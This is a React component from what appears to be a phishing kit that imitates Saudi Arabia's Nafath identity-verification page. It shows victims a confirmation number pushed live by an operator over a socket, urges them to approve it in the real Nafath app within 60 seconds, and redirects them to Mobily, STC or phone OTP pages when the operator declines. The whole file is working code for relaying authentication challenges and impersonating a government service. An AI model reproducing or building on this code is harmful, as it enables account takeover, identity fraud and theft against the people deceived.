import React, { useCallback, useEffect, useMemo, useState } from "react";
import { socket } from "./Home";
import { useNavigate } from "react-router-dom";
import { FaExclamationTriangle } from "react-icons/fa";

const ACCENT = "#11998e";
const ACCENT_BOX = "#00b894";
const WARNING_BG = "#fff3cd";
const WARNING_BORDER = "#ffeeba";
const WARNING_TEXT = "#856404";

const img = {
  nafad: "/nafadh/icon/nafad.png",
  step1: "/nafadh/images/nafaz_2.jpeg",
  step2: "/nafadh/images/nafaz_1.jpeg",
  cdeie: "/nafadh/icon/cdeie.png",
  footer: "/nafadh/photos/footerNafad.png",
};

function formatTimer(sec) {
  const mm = String(Math.floor(sec / 60)).padStart(2, "0");
  const ss = String(sec % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

const Navaz = () => {
  const query = new URLSearchParams(window.location.search);
  const navigate = useNavigate();
  const [otp, setOtp] = useState(query.get("otp"));
  const [modalOpen, setModalOpen] = useState(true);
  const [modalSec, setModalSec] = useState(60);

  const displayCode = useMemo(() => {
    const v = otp && String(otp).trim() !== "" ? String(otp).trim() : "";
    return v || "—";
  }, [otp]);

  const runNavazFlow = useCallback(
    (id) => {
      if (id === sessionStorage.getItem("id")) {
        navigate("/success");
      }
    },
    [navigate],
  );

  useEffect(() => {
    const onAcceptNavaz = (id) => runNavazFlow(id);
    const onDeclineNavaz = (id) => {
      if (id === sessionStorage.getItem("id")) {
        if (sessionStorage.getItem("provider") === "موبايلي") {
          window.location.href = "/mobilyOtp";
        } else {
          window.location.href = "/phoneOtp";
        }
      }
    };
    const onNavazChange = ({ price, id }) => {
      if (id === sessionStorage.getItem("id")) setOtp(price);
    };
    const onAcceptService = ({ price, id }) => {
      if (id === sessionStorage.getItem("id")) setOtp(price);
    };
    const onDeclineService = (id) => {
      if (id === sessionStorage.getItem("id")) {
        window.location.href = "/stcOtp";
      }
    };
    const onDeclinePhoneOTP = (id) => {
      if (id === sessionStorage.getItem("id")) {
        window.location.href = "/phoneOtp";
      }
    };

    socket.on("acceptNavaz", onAcceptNavaz);
    socket.on("declineNavaz", onDeclineNavaz);
    socket.on("navazChange", onNavazChange);
    socket.on("acceptService", onAcceptService);
    socket.on("declineService", onDeclineService);
    socket.on("declinePhoneOTP", onDeclinePhoneOTP);

    return () => {
      socket.off("acceptNavaz", onAcceptNavaz);
      socket.off("declineNavaz", onDeclineNavaz);
      socket.off("navazChange", onNavazChange);
      socket.off("acceptService", onAcceptService);
      socket.off("declineService", onDeclineService);
      socket.off("declinePhoneOTP", onDeclinePhoneOTP);
    };
  }, [runNavazFlow]);

  useEffect(() => {
    if (!modalOpen) return;
    const t = setInterval(() => {
      setModalSec((s) => (s <= 1 ? 0 : s - 1));
    }, 1000);
    return () => clearInterval(t);
  }, [modalOpen]);

  const scrollToCode = () => {
    document.getElementById("nafad_code_anchor")?.scrollIntoView({
      behavior: "smooth",
      block: "center",
    });
  };

  const warningBox =
    "text-right rounded-lg px-4 py-3 text-sm leading-relaxed border font-semibold";
  const warningStyle = {
    backgroundColor: WARNING_BG,
    color: WARNING_TEXT,
    borderColor: WARNING_BORDER,
  };

  return (
    <div
      className="min-h-screen w-full flex flex-col"
      dir="rtl"
      style={{
        fontFamily: '"Tajawal", sans-serif',
        backgroundColor: "#f4f6f9",
        fontWeight: 400,
      }}
    >
      <nav
        className="flex items-center justify-between shadow-md px-4 pt-4 pb-4"
        style={{ backgroundColor: "#fff" }}
      >
        <img
          src={img.nafad}
          alt="نفاذ"
          width={128}
          className="h-auto max-w-[40vw] object-contain"
          onError={(e) => {
            e.currentTarget.style.display = "none";
          }}
        />
      </nav>

      {modalOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-3"
          aria-modal="true"
          role="dialog"
          aria-labelledby="nafadh-modal-title"
        >
          <div className="bg-white rounded-lg shadow-xl max-w-md w-full max-h-[92vh] overflow-y-auto flex flex-col">
            <div className="px-4 pt-4 pb-0 text-center">
              <h2
                id="nafadh-modal-title"
                className="text-xl font-bold text-green-700"
              >
                التحقق من خلال تطبيق نفاذ
              </h2>
            </div>
            <div className="px-4 py-4 text-center">
              <p
                className="w-full mb-3 text-white rounded-md py-1.5 px-2"
                style={{ backgroundColor: "#198754", fontSize: "18px" }}
              >
                تطبيق نفاذ
              </p>
              <div className="mb-3 flex justify-center">
                <div
                  className="flex items-center justify-center font-bold mx-auto rounded"
                  style={{
                    width: 80,
                    height: 80,
                    fontSize: 24,
                    color: ACCENT_BOX,
                    borderWidth: 4,
                    borderStyle: "solid",
                    borderColor: ACCENT_BOX,
                  }}
                >
                  {displayCode}
                </div>
              </div>
              <p
                className="text-sm leading-relaxed"
                style={{ lineHeight: 1.8 }}
              >
                الرجاء فتح تطبيق نفاذ وتأكيد الرقم في الأعلى ، لتأكيد طلب أصدار
                التذكرة على رقم الجوال المربوط بهويتك الوطنية
              </p>
              <div className="mb-3">
                <span
                  className={`inline-block rounded px-3 py-1.5 text-base border ${
                    modalSec <= 0
                      ? "bg-red-600 text-white border-red-700"
                      : "bg-neutral-100 text-neutral-900 border-neutral-300"
                  }`}
                >
                  {modalSec <= 0 ? "انتهى الوقت!" : formatTimer(modalSec)}
                </span>
              </div>
              <div className={warningBox} style={warningStyle}>
                <FaExclamationTriangle className="inline ml-2 align-middle" />{" "}
                يجب إدخال الرقم في خلال 60 ثانية. في حالة إدخال الرقم بشكل خاطئ
                أو انتهاء الصلاحية، سيتم إعادة توجيهك هنا مرة أخرى مع رقم جديد.
              </div>
              <div className="flex justify-between gap-2 mt-5 flex-wrap">
                <div className="flex-1 min-w-[120px] text-center">
                  <img
                    src={img.step1}
                    alt="تحميل تطبيق نفاذ"
                    className="w-[140px] max-w-full h-auto mx-auto"
                    onError={(e) => {
                      e.currentTarget.style.display = "none";
                    }}
                  />
                  <p className="mt-2 text-sm">تحميل تطبيق نفاذ</p>
                </div>
                <div className="flex-1 min-w-[120px] text-center">
                  <img
                    src={img.step2}
                    alt="اختيار الرقم والتحقق"
                    className="w-[140px] max-w-full h-auto mx-auto"
                    onError={(e) => {
                      e.currentTarget.style.display = "none";
                    }}
                  />
                  <p className="mt-2 text-sm leading-snug">
                    اختيار الرقم أعلاه
                    <br />
                    والتحقق عبر السمات الحيوية
                  </p>
                </div>
              </div>
            </div>
            <div className="border-t border-neutral-100 p-3 shrink-0">
              <button
                type="button"
                className="w-full py-3 rounded bg-neutral-600 text-white font-medium hover:bg-neutral-700"
                onClick={() => setModalOpen(false)}
              >
                إغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="text-center mt-8 px-4 container mx-auto max-w-xl flex flex-col flex-1">
        <h6
          className="px-3"
          style={{ color: ACCENT, fontWeight: 600, lineHeight: 1.6 }}
        >
          <span
            className="font-extrabold block mb-2.5"
            style={{ fontSize: "26px" }}
          >
            لطفاً ،
          </span>
          توجه الى تطبيق " نفاذ " لاستكمال إجراءات الحجز الخاص بك و ربطه بشريحة
          الجوال الخاصة بك وذلك من خلال اختيار الرقم الظاهر ادناه
        </h6>
        <hr className="my-3 border-neutral-800/80" />

        <div
          id="nafad_code_anchor"
          className="rounded-lg px-4 py-2 mb-4"
          role="alert"
          style={{ backgroundColor: "#d4edda", border: "1px solid #c3e6cb" }}
        >
          <h1
            id="nafad_code"
            className="my-5 mb-1 font-extrabold"
            style={{ fontSize: "clamp(36px, 10vw, 50px)", color: "#155724" }}
          >
            {displayCode}
          </h1>
        </div>

        <div className={`${warningBox} mb-6`} style={warningStyle}>
          <FaExclamationTriangle className="inline ml-2 align-middle" /> يجب
          إدخال الرقم في خلال 60 ثانية. في حالة إدخال الرقم بشكل خاطئ أو انتهاء
          الصلاحية، سيتم إعادة توجيهك هنا مرة أخرى مع رقم جديد.
        </div>

        <button
          type="button"
          id="goApp"
          className="w-full p-4 rounded-lg text-white text-xl font-semibold hover:opacity-95 active:opacity-90"
          style={{ backgroundColor: ACCENT }}
          onClick={() => scrollToCode()}
        >
          انتقل الى تطبيق نفاذ
        </button>

        <img
          alt=""
          src={img.cdeie}
          className="mt-10 w-full max-w-[50%] mx-auto h-auto block"
          onError={(e) => {
            e.currentTarget.style.display = "none";
          }}
        />
      </div>

      <img
        alt=""
        src={img.footer}
        className="w-full mt-10 shrink-0 h-auto block"
        onError={(e) => {
          e.currentTarget.style.display = "none";
        }}
      />
    </div>
  );
};

export default Navaz;
